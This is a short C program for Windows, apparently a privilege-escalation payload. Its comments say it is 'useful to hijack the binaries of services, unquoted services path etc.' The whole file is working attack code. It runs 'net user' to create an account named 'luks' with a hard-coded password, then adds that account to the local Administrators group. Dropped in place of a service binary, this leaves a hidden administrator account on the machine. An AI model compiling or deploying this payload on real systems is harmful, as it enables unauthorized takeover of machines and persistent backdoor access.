// create a user and put it in the Administrators group
// useful to hijack the binaries of services, unquoted services path etc.

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user luks password123!");
  i = system ("net localgroup administrators luks /add");
  
  return 0;
}
